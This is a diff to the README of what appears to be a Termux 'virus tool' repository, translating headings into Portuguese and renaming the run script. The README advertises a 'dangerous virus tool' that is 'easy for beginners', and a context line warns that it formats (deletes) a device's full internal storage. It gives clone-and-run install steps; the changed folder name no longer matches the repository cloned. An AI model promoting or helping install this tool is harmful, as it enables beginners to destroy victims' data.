@@ -29,27 +29,27 @@ Warning 🚦 This Virus Formates (Deletes) Full Internal Storage So think and Us
 <p align="center"><a href="https://rebrand.ly/noobhacktube"><img title="Noob Hackers" src="https://user-images.githubusercontent.com/49580304/117566254-31801e00-b0d3-11eb-860d-5601b1adccb8.jpg"></a>
 </p>
 
-## AVAILABLE ON :
+## DISPONÍVEL EM :
 
 * Termux
 
-### TESTED ON :
+### TESTADO EM TERMUX :
 
 * Termux
 
-### REQUIREMENTS :
+### REQUERIMENTOS :
 * internet
-* external storage permission
-* storage 400 MB
+* permissão para memória externa
+* memória 400 MB
 * 1gb ram
 
-## FEATURES :
+## CARACTERÍSTICAS :
 * [+] Dangerous virus tool !
 * [+] Updated maintainence !
 * [+] Easy for beginners !
 * [+] Working virus tool for termux !
 
-## INSTALLATION [Termux] :
+## INSTALAÇÃO [Termux] :
 
 * `apt-get update -y`
 * `apt-get upgrade -y`
@@ -60,9 +60,9 @@ Warning 🚦 This Virus Formates (Deletes) Full Internal Storage So think and Us
 * `git clone https://github.com/noob-hackers/infect`
 * `cd $HOME`
 * `ls`
-* `cd infect`
+* `cd WostHack`
 * `ls`
-* `bash infect.sh`
+* `bash wosthack.sh`
 ```
 [+]-- Now you need internet connection to continue further process...
 [+]-- You can select any option by clicking on your keyboard
